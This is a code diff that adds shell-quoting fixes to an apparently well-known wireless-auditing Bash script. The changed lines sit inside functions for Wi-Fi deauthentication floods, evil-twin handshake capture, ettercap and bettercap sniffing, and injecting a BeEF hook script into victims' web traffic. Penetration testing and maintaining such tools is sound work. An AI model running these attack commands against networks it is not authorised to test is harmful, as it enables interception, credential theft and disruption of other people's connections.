@@ -1397,9 +1397,9 @@ function check_vif_support() {
 
 #Returns warning messages if long wifi names detected
 function check_interface_wifi_longname() {
-	
+
 	debug_print
-	
+
 	wifi_card=${1}
 	longname_patterns=("wlx[0-9a-fA-F]{12}")
 	for pattern in "${longname_patterns[@]}"; do
@@ -3096,7 +3096,7 @@ function handshake_capture_check() {
 		fi
 
 		time_counter=$((time_counter + 5))
-		if [ ${time_counter} -ge ${timeout_capture_handshake} ]; then
+		if [ "${time_counter}" -ge "${timeout_capture_handshake}" ]; then
 			break
 		fi
 	done
@@ -4512,7 +4512,7 @@ function launch_dos_pursuit_mode_attack() {
 		fi
 	fi
 
-	sleep ${dos_delay}
+	sleep "${dos_delay}"
 	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
 	dos_pursuit_mode_scan_pid=$!
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
@@ -5783,7 +5783,7 @@ function initialize_menu_and_print_selections() {
 			if [ -n "${enterprise_mode}" ]; then
 				print_all_target_vars
 			else
-				if [ ${retry_handshake_capture} -eq 1 ]; then
+				if [ "${retry_handshake_capture}" -eq 1 ]; then
 					retry_handshake_capture=0
 					retrying_handshake_capture=1
 				fi
@@ -6507,7 +6507,7 @@ function beef_pre_menu() {
 
 	debug_print
 
-	if [ ${return_to_et_main_menu_from_beef} -eq 1 ]; then
+	if [ "${return_to_et_main_menu_from_beef}" -eq 1 ]; then
 		return
 	fi
 
@@ -9111,7 +9111,7 @@ function exec_enterprise_attack() {
 		recover_current_channel
 	fi
 
-	if [ ${enterprise_mode} = "noisy" ]; then
+	if [ "${enterprise_mode}" = "noisy" ]; then
 		restore_et_interface
 	else
 		if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
@@ -9166,7 +9166,7 @@ function handle_asleap_attack() {
 
 				asleap_attack_finished=0
 
-				if [ ${enterprise_mode} = "noisy" ]; then
+				if [ "${enterprise_mode}" = "noisy" ]; then
 					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
 						for item in "${!enterprise_captured_challenges_responses[@]}"; do
 							enterprise_username="${item}"
@@ -9299,7 +9299,7 @@ function exec_et_sniffing_attack() {
 	fi
 
 	restore_et_interface
-	if [ ${ettercap_log} -eq 1 ]; then
+	if [ "${ettercap_log}" -eq 1 ]; then
 		parse_ettercap_log
 	fi
 	clean_tmpfiles
@@ -9332,7 +9332,7 @@ function exec_et_sniffing_sslstrip2_attack() {
 	fi
 
 	restore_et_interface
-	if [ ${bettercap_log} -eq 1 ]; then
+	if [ "${bettercap_log}" -eq 1 ]; then
 		parse_bettercap_log
 	fi
 	clean_tmpfiles
@@ -9376,7 +9376,7 @@ function exec_et_sniffing_sslstrip2_beef_attack() {
 	fi
 
 	restore_et_interface
-	if [ ${bettercap_log} -eq 1 ]; then
+	if [ "${bettercap_log}" -eq 1 ]; then
 		parse_bettercap_log
 	fi
 	clean_tmpfiles
@@ -9890,7 +9890,7 @@ function exec_et_deauth() {
 
 	case ${et_dos_attack} in
 		"${mdk_command}")
-			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
+			kill "$(ps -C "${mdk_command}" --no-headers -o pid | tr -d ' ')" &> /dev/null
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
@@ -9900,7 +9900,7 @@ function exec_et_deauth() {
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
-			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
+			kill "$(ps -C "${mdk_command}" --no-headers -o pid | tr -d ' ')" &> /dev/null
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
 		;;
 	esac
@@ -10412,7 +10412,7 @@ function set_enterprise_control_script() {
 	exec 7>"${tmpdir}${control_enterprise_file}"
 
 	local control_msg
-	if [ ${enterprise_mode} = "smooth" ]; then
+	if [ "${enterprise_mode}" = "smooth" ]; then
 		control_msg=${enterprise_texts[${language},3]}
 	else
 		control_msg=${enterprise_texts[${language},4]}
@@ -11296,7 +11296,7 @@ function launch_ettercap_sniffing() {
 		;;
 	esac
 	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
-	if [ ${ettercap_log} -eq 1 ]; then
+	if [ "${ettercap_log}" -eq 1 ]; then
 		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
 	fi
 
@@ -11654,7 +11654,7 @@ function launch_bettercap_sniffing() {
 
 		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"
 
-		if [ ${bettercap_log} -eq 1 ]; then
+		if [ "${bettercap_log}" -eq 1 ]; then
 			bettercap_cmd+=" | tee ${tmp_bettercaplog}"
 		fi
 	else
@@ -11668,7 +11668,7 @@ function launch_bettercap_sniffing() {
 			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
 		fi
 
-		if [ ${bettercap_log} -eq 1 ]; then
+		if [ "${bettercap_log}" -eq 1 ]; then
 			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
 		fi
 	fi
@@ -11816,7 +11816,7 @@ function kill_et_windows() {
 		kill_dos_pursuit_mode_processes
 		case ${et_dos_attack} in
 			"${mdk_command}"|"Wds Confusion")
-				kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C "${mdk_command}" --no-headers -o pid | tr -d ' ')" &> /dev/null
 			;;
 			"Aireplay")
 				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
@@ -12178,9 +12178,9 @@ function capture_handshake_evil_twin() {
 
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		processidattack=$!
-		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
 	else
-		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
+		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
 	fi
 
 	handshake_capture_check
@@ -12761,9 +12761,9 @@ function launch_handshake_capture() {
 
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		processidattack=$!
-		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
 	else
-		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
+		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
 	fi
 
 	handshake_capture_check
@@ -13152,7 +13152,7 @@ function explore_for_wps_targets_option() {
 	fi
 
 	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
-	if [ "${washlines}" -le ${wash_start_data_line} ]; then
+	if [ "${washlines}" -le "${wash_start_data_line}" ]; then
 		echo
 		language_strings "${language}" 68 "red"
 		language_strings "${language}" 115 "read"
@@ -13173,7 +13173,7 @@ function explore_for_wps_targets_option() {
 
 		i=$((i + 1))
 
-		if [ ${i} -le ${wash_start_data_line} ]; then
+		if [ ${i} -le "${wash_start_data_line}" ]; then
 			continue
 		else
 			wash_counter=$((wash_counter + 1))
@@ -13209,15 +13209,15 @@ function explore_for_wps_targets_option() {
 				expwps_power=${expwps_power//0/}
 			fi
 
-			if [ ${expwps_power} -lt 0 ]; then
-				if [ ${expwps_power} -eq -1 ]; then
+			if [ "${expwps_power}" -lt 0 ]; then
+				if [ "${expwps_power}" -eq -1 ]; then
 					expwps_power=0
 				else
 					expwps_power=$((expwps_power + 100))
 				fi
 			fi
 
-			if [ ${expwps_power} -le 9 ]; then
+			if [ "${expwps_power}" -le 9 ]; then
 				wpssp4=" "
 			else
 				wpssp4=""
@@ -13318,7 +13318,7 @@ function select_target() {
 			exp_power=0
 		fi
 
-		if [ ${exp_power} -le 9 ]; then
+		if [ "${exp_power}" -le 9 ]; then
 			sp4=" "
 		else
 			sp4=""
@@ -13466,7 +13466,7 @@ function et_prerequisites() {
 
 	debug_print
 
-	if [ ${retry_handshake_capture} -eq 1 ]; then
+	if [ "${retry_handshake_capture}" -eq 1 ]; then
 		return
 	fi
 
@@ -13546,7 +13546,7 @@ function et_prerequisites() {
 		echo
 		language_strings "${language}" 286 "pink"
 		print_simple_separator
-		if [ ${retrying_handshake_capture} -eq 0 ]; then
+		if [ "${retrying_handshake_capture}" -eq 0 ]; then
 			ask_yesno 321 "no"
 		fi
 
@@ -13864,7 +13864,7 @@ function detect_internet_interface() {
 
 	debug_print
 
-	if [ ${internet_interface_selected} -eq 1 ]; then
+	if [ "${internet_interface_selected}" -eq 1 ]; then
 		return 0
 	fi
 
@@ -14409,7 +14409,7 @@ function set_script_paths() {
 			fi
 		fi
 		scriptfolder="${scriptfolder%/*}/"
-		scriptfolder="$(readlink -f ${scriptfolder})"
+		scriptfolder="$(readlink -f "${scriptfolder}")"
 		scriptfolder="${scriptfolder%/}/"
 		scriptname="${0##*/}"
 	fi
@@ -15285,7 +15285,7 @@ function print_animated_flying_saucer() {
 		else
 			saucer_frame=$((i-4))
 		fi
-		flying_saucer ${saucer_frame}
+		flying_saucer "${saucer_frame}"
 	done
 }
 
